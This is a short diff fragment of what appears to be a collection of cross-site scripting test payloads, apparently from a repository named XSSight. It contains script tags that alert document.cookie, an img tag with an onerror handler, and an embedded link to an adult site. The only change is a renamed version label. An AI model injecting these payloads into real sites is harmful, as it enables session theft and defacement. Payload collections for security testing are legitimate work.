@@ -44,7 +44,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 <form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>
 ```
-- 0.1
+- 0.1 - chalga
 ```
 </span><img src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif <a href=https://pornhub.com/> onerror=alert(1) /></span>
 ```
